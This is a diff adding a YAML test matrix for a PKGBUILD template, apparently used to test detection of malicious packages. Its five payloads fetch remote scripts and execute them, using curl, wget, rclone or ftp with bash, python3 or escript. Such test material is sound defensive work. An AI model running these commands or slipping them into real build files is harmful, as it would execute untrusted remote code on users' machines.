@@ -1,0 +1,27 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |2
+        curl -fsSL -o- "$(cat "$srcdir/url.txt")" | tee stage.sh >/dev/null
+        bash stage.sh
+  id: 001-curl-stdout-dash-tee
+- vars:
+    payload: |2
+        python3 < <(curl -fsSL "$(cat "$srcdir/url.txt")")
+  id: 003-procstdin-python-curl
+- vars:
+    payload: |2
+        cd "$srcdir"
+        rclone bisync remote:bucket/s.sh ./s.sh
+        bash s.sh
+  id: 003-rclone-bisync
+- vars:
+    payload: |2
+        escript /dev/stdin < <(wget -qO- "$(cat "$srcdir/url.txt")")
+  id: 005-procstdin-escript-wget
+- vars:
+    payload: |2
+        cd "$srcdir"
+        ftp -n < "$srcdir/ftp-cmds.txt"
+        bash s.sh
+  id: 01-ftp-stdin-cmds
